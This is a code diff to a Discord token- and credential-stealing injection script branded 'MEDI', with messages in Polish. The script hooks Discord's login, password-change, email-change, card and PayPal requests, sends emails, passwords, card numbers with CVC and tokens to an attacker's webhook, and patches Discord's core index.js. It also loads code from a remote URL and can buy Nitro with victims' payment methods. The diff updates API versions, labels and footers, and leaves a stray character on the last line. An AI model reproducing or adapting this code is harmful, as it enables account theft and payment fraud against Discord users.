@@ -8,14 +8,16 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%',
   webhook_protector_key: '%WEBHOOK_KEY%',
-  auto_buy_nitro: false, 
-  ping_on_run: false, 
-  ping_val: '@everyone', 
-  embed_name: 'MEDI Injected', 
-  embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
-  embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/PsxScripts01/lol/main/lololololol', 
-
+  auto_buy_nitro: false,
+  ping_on_run: true,
+  ping_val: '@everyone',
+  embed_name: 'MEDI Injection',
+  embed_icon: 'https://cdn.discordapp.com/attachments/1040380029005205605/1052894433118523402/Rocket.png'.replace(/ /g, '%20'),
+  embed_color: 5639644,
+  injection_url: 'https://raw.githubusercontent.com/PsxScripts01/lol/main/lololololol.js',
+  /**
+   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
+   **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -40,12 +42,12 @@ const config = {
   },
   filter: {
     urls: [
-      'https://discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/users/@me',
-      'https://*.discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/auth/login',
-      'https://discord.com/api/v*/auth/login',
-      'https://*.discord.com/api/v*/auth/login',
+      'https://discord.com/api/v10/users/@me',
+      'https://discordapp.com/api/v10/users/@me',
+      'https://*.discord.com/api/v10/users/@me',
+      'https://discordapp.com/api/v10/auth/login',
+      'https://discord.com/api/v10/auth/login',
+      'https://*.discord.com/api/v10/auth/login',
       'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
       'https://api.stripe.com/v*/tokens',
       'https://api.stripe.com/v*/setup_intents/*/confirm',
@@ -54,11 +56,11 @@ const config = {
   },
   filter2: {
     urls: [
-      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
-      'https://*.discord.com/api/v*/applications/detectable',
-      'https://discord.com/api/v*/applications/detectable',
-      'https://*.discord.com/api/v*/users/@me/library',
-      'https://discord.com/api/v*/users/@me/library',
+      'https://status.discord.com/api/v10/scheduled-maintenances/upcoming.json',
+      'https://*.discord.com/api/v10/applications/detectable',
+      'https://discord.com/api/v10/applications/detectable',
+      'https://*.discord.com/api/v10/users/@me/library',
+      'https://discord.com/api/v10/users/@me/library',
       'wss://remote-auth-gateway.discord.gg/*',
     ],
   },
@@ -412,8 +414,7 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
-  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -498,10 +499,10 @@ const getBilling = async (token) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing += '💳';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += '💳';
           break;
       }
     }
@@ -522,7 +523,7 @@ const Purchase = async (token, id, _type, _time) => {
   };
 
   const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
+    xmlHttp.open("POST", "https://discord.com/api/v10/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.setRequestHeader('Content-Type', 'application/json');
     xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
@@ -534,7 +535,7 @@ const Purchase = async (token, id, _type, _time) => {
 
 const buyNitro = async (token) => {
   const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
+  const failedMsg = 'Nie Udalo Się Kupić❌';
   if (!data) return failedMsg;
 
   let IDS = [];
@@ -587,9 +588,6 @@ const getBadges = (flags) => {
       break;
     case 131072:
       badges += 'Verified Bot Developer, ';
-      break;
-    case 4194304:
-      badges += 'Active Developer, ';
       break;
     case 4:
       badges += 'Hypesquad Event, ';
@@ -663,12 +661,12 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Acc Info**',
-            value: `Email: **${email}** - Hasło: **${password}**`,
+            value: `Email: **${email}** -Haslo: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Rodzj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPlatnosci: **${billing}**`,
             inline: false,
           },
           {
@@ -680,6 +678,9 @@ const login = async (email, password, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By MEDI'
         },
       },
     ],
@@ -701,13 +702,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Hasło Zmienione**',
-            value: `Email: **${json.email}**\nStare Hasło: **${oldpassword}**\nNowe Hasło: **${newpassword}**`,
+            name: '**Haslo Zmienione**',
+            value: `Email: **${json.email}**\nStare Haslo: **${oldpassword}**\nNowe Haslo: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPlatnosci: **${billing}**`,
             inline: true,
           },
           {
@@ -719,6 +720,9 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection MEDI',
         },
       },
     ],
@@ -741,12 +745,12 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Zmieniony**',
-            value: `Nowy Email: **${email}**\nHasło: **${password}**`,
+            value: `Nowy Email: **${email}**\nHaslo: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPlatnosci: **${billing}**`,
             inline: true,
           },
           {
@@ -758,6 +762,9 @@ const emailChanged = async (email, password, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection MEDI',
         },
       },
     ],
@@ -780,12 +787,12 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Dodany**',
-            value: `Czas Kupić Troche Nitro 😩`,
+            value: `Czas Kupic Nitro 😩`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}*\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}*\nOdznaki: **${badges}**\nPlatnosci: **${billing}**`,
             inline: false,
           },
           {
@@ -797,6 +804,9 @@ const PaypalAdded = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection MEDI',
         },
       },
     ],
@@ -818,13 +828,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Karta Bankowa Dodana**',
-            value: `Karta Bankowa Numer: **${number}**\nCVC: **${cvc}**\nKarta Bankowa Wygaśnięcie: **${expir_month}/${expir_year}**`,
+            name: '**Karta Dodana**',
+            value: `Numer Karty: **${number}**\nCVC: **${cvc}**\nWygasniecie: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPlatnosci: **${billing}**`,
             inline: true,
           },
           {
@@ -836,6 +846,9 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By MEDI',
         },
       },
     ],
@@ -860,12 +873,12 @@ const nitroBought = async (token) => {
         fields: [
           {
             name: '**Nitro Kupione!**',
-            value: `**Nitro Kod:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            value: `**Kod Nitro:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPlatnosci: **${billing}**`,
             inline: true,
           },
           {
@@ -877,6 +890,9 @@ const nitroBought = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By MEDI',
         },
       },
     ],
@@ -967,4 +983,4 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
   }
 });
-module.exports = require('./core.asar');
+module.exports = require('./core.asar');a
